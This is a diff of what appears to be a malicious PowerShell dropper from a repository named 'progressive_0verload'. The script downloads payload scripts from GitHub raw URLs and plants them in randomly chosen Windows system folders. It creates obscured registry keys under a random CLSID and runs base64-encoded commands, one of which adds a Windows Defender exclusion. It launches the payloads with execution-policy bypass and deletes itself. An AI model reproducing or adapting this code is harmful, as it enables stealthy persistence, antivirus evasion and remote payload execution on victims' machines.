@@ -1,13 +1,13 @@
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
 $currLoc = $MyInvocation.MyCommand.Path
-$paths = @("$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\System32","$env:windir\System32\drivers","$env:windir\System32\en-US","$env:windir\System32\LogFiles\WMI","$env:windir\System32\wbem\en-US","C:\Recovery","$env:temp","$env:ProgramData","$env:windir\SysWOW64","$env:appdata\SystemInformer","$env:localappdata\Microsoft\Windows","$env:windir\System32\WindowsPowerShell\v1.0\Modules","$env:windir\System32\drivers\etc","$env:windir\WinSxS","$env:windir\System32\spool\drivers\x64\3\en-US","$env:windir\System32\spool","$env:windir\System32\catroot2","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\NetworkService")
+$paths = @("$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\System32","$env:windir\System32\drivers","$env:windir\System32\en-US","$env:windir\System32\LogFiles\WMI","$env:windir\System32\wbem\en-US","C:\Recovery","$env:temp","$env:ProgramData","$env:windir\SysWOW64","$env:appdata\SystemInformer","$env:localappdata\Microsoft\Windows","$env:windir\System32\WindowsPowerShell\v1.0\Modules","$env:windir\System32\drivers\etc","$env:windir\System32\spool\drivers\x64\3\en-US","$env:windir\System32\spool","$env:windir\System32\catroot2","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\NetworkService")
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
 $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
-$basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
+$basePath = "HKCU:\Software\Classes\CLSID\'$g'\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
 New-Item -Path $basePath -Force
 New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
@@ -68,7 +68,7 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATgBlAHQAdwBvAHIAawBTAGUAcgB2AGkAYwBlACIAIAAvAGYA"
 
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\yXureYzQpIRLN'"
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 12
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\yXureYzQpIRLN'"
 
 Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue
